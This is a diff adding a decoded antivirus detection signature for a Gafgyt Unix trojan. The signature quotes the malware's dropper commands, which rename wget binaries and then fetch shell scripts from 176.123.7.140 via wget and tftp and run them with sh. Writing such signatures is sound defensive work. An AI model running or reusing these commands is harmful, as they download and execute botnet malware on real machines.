@@ -1,0 +1,28 @@
+VIRUS NAME: Unix.Trojan.Gafgyt-9876341-0
+TDB: Engine:51-255,Target:6
+LOGICAL EXPRESSION: 0&1&2&3&4
+ * SUBSIG ID 0
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+t /bin/-wget;mv /usr/sbin/wget /usr/sbin/-wget;mv /usr/bin/wget /usr/bin/-wget;mv /sbin/wget /bin/-wget;echo -e 'binfagt'
+ * SUBSIG ID 1
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+et;mv -f /bin/-wget /bin/wget;mv -f /sbin/-wget /bin/wget;wget http://176.123.7.140/bin.sh; sh bin.sh; wget1 http://176.123.7.14
+ * SUBSIG ID 2
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+0/bin2.sh; sh bin2.sh; tftp -r tftp.sh -g 176.123.7.140; sh tftp.sh; tftp 176.123.7.140 -c get tftp2.sh; sh tftp2.sh;mv /bin/wge
+ * SUBSIG ID 3
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;mv -f /usr/bin/-wget /usr/bin/wget;mv -f /usr/sbin/-wget /usr/bin/wg
+ * SUBSIG ID 4
+ +-> OFFSET: ANY
+ +-> SIGMOD: NONE
+ +-> DECODED SUBSIGNATURE:
+TERROR v1 - 128 MAX - 8 TIMEOUT - WGET
